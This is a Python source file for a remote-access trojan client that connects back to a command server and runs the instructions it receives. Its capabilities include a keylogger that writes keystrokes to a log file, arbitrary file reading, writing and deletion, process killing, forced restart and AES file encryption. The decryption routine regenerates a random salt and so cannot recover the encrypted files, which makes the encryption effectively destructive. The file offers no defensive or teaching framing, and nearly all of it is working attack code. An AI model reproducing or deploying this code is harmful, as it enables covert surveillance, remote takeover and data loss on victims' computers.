import subprocess
import os
import socket
import shutil
import threading
from pynput.keyboard import Listener
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives import hashes

keylog_file = "keystrokes.log"
keylogger_running = False
keylogger_thread = None
keylogger_listener = None

def on_press(key):
    with open(keylog_file, 'a') as f:
        f.write(f"{key}\n")

def start_keylogger():
    global keylogger_running, keylogger_thread, keylogger_listener
    if not keylogger_running:
        keylogger_running = True
        keylogger_thread = threading.Thread(target=run_keylogger)
        keylogger_thread.start()
        return "Keylogger started."
    else:
        return "Keylogger is already running."

def run_keylogger():
    global keylogger_listener
    keylogger_listener = Listener(on_press=on_press)
    keylogger_listener.start()
    keylogger_listener.join()

def stop_keylogger():
    global keylogger_running, keylogger_listener
    if keylogger_running:
        keylogger_running = False
        if keylogger_listener is not None:
            keylogger_listener.stop()
            keylogger_listener = None
        return "Keylogger stopped."
    else:
        return "Keylogger is not running."

def execute_command(command):
    try:
        if command.lower().startswith('ipconfig'):
            result = subprocess.run(['ipconfig'], capture_output=True, text=True)
            return result.stdout
        elif command.lower().startswith('cd '):
            _, path = command.split(' ', 1)
            os.chdir(path)
            return f"Changed directory to '{path}'"
        elif command.lower().startswith('mkdir '):
            _, directory_name = command.split(' ', 1)
            os.mkdir(directory_name)
            return f"Directory '{directory_name}' created successfully"
        elif command.lower().startswith('read '):
            _, filename = command.split(' ', 1)
            with open(filename, 'r') as f:
                content = f.read()
            return f"Content of '{filename}':\n{content}"
        elif command.lower().startswith('pwd'):
            current_dir = os.getcwd()
            return f"Current directory is: {current_dir}"
        elif command.lower().startswith('ls'):
            contents = os.listdir()
            return "\n".join(contents)
        elif command.lower().startswith('cat '):
            _, filename = command.split(' ', 1)
            with open(filename, 'r') as f:
                content = f.read()
            return f"Content of '{filename}':\n{content}"
        elif command.lower().startswith('write '):
            _, filename, content = command.split(' ', 2)
            with open(filename, 'w') as f:
                f.write(content)
            return f"Successfully wrote to '{filename}'"
        elif command.lower().startswith('delete '):
            _, filename = command.split(' ', 1)
            os.remove(filename)
            return f"Deleted '{filename}'"
        elif command.lower().startswith('rename '):
            _, old_filename, new_filename = command.split(' ', 2)
            os.rename(old_filename, new_filename)
            return f"Renamed '{old_filename}' to '{new_filename}'"
        elif command.lower().startswith('copy '):
            _, source_file, destination_file = command.split(' ', 2)
            shutil.copy(source_file, destination_file)
            return f"Copied '{source_file}' to '{destination_file}'"
        elif command.lower().startswith('ps'):
            result = subprocess.run(['ps', '-ef'], capture_output=True, text=True)
            return result.stdout
        elif command.lower().startswith('kill '):
            _, process_id = command.split(' ', 1)
            subprocess.run(['kill', process_id])
            return f"Process with ID '{process_id}' killed"
        elif command.lower().startswith('uname -a'):
            result = subprocess.run(['uname', '-a'], capture_output=True, text=True)
            return result.stdout
        elif command.lower().startswith('whoami'):
            result = subprocess.run(['whoami'], capture_output=True, text=True)
            return result.stdout
        elif command.lower().startswith('netstat'):
            result = subprocess.run(['netstat'], capture_output=True, text=True)
            return result.stdout
        elif command.lower().startswith('ping '):
            _, host = command.split(' ', 1)
            result = subprocess.run(['ping', '-c', '4', host], capture_output=True, text=True)
            return result.stdout
        elif command.lower().startswith('traceroute '):
            _, host = command.split(' ', 1)
            result = subprocess.run(['traceroute', host], capture_output=True, text=True)
            return result.stdout
        elif command.lower().startswith('shutdown'):
            subprocess.run(['shutdown', '-r', '-t', '0'])  # Command to restart immediately
            return "Restarting..."
        elif command.lower().startswith('sleep'):
            subprocess.run(['sleep', '5m'])
            return "Putting system to sleep..."
        elif command.lower().startswith('encrypt '):
            _, filename, key = command.split(' ', 2)
            response = encrypt_file(filename, key)
            return response
        elif command.lower().startswith('decrypt '):
            _, encrypted_filename, key = command.split(' ', 2)
            try:
                decrypted_content = decrypt_file(encrypted_filename, key)
                return f"Decrypted content of '{encrypted_filename}':\n{decrypted_content}"
            except Exception as e:
                return f"Error decrypting file '{encrypted_filename}': {str(e)}"
        elif command.lower().startswith('start_keylogger'):
            return start_keylogger()
        elif command.lower().startswith('stop_keylogger'):
            return stop_keylogger()
        else:
            return f"Command '{command}' not recognized"
    except Exception as e:
        return f"Error executing command '{command}': {str(e)}"

def encrypt_file(filename, key):
    # Generate a random initialization vector
    iv = os.urandom(16)

    # Derive a key from the provided password
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        salt=os.urandom(16),
        iterations=100000,
        length=32,
        backend=default_backend()
    )
    derived_key = kdf.derive(key.encode())

    # Read the file content
    with open(filename, 'rb') as f:
        plaintext = f.read()

    # Pad the plaintext to be a multiple of 16 bytes (AES block size)
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(plaintext) + padder.finalize()

    # Encrypt the padded data
    cipher = Cipher(algorithms.AES(derived_key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Write the IV and encrypted data to a file
    with open(filename + ".encrypted", 'wb') as f:
        f.write(iv)
        f.write(encrypted_data)

    return f"File '{filename}' encrypted successfully as '{filename}.encrypted'"

def decrypt_file(encrypted_filename, key):
    with open(encrypted_filename, 'rb') as f:
        iv = f.read(16)  # Read the IV from the file
        ciphertext = f.read()  # Read the encrypted data

    # Derive the key from the provided password
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        salt=os.urandom(16),
        iterations=100000,
        length=32,
        backend=default_backend()
    )
    derived_key = kdf.derive(key.encode())

    # Decrypt the data
    cipher = Cipher(algorithms.AES(derived_key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()

    # Unpad the decrypted data
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()

    return unpadded_data.decode('utf-8')  # Assuming the original data was text

def start_client(host='127.0.0.1', port=4445):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))
    print("[*] Connected to server")

    while True:
        command = client_socket.recv(1024).decode()

        if command.lower() == 'exit':
            print("Exiting...")
            break

        response = execute_command(command)
        client_socket.send(response.encode())

    client_socket.close()

if __name__ == "__main__":
    start_client()
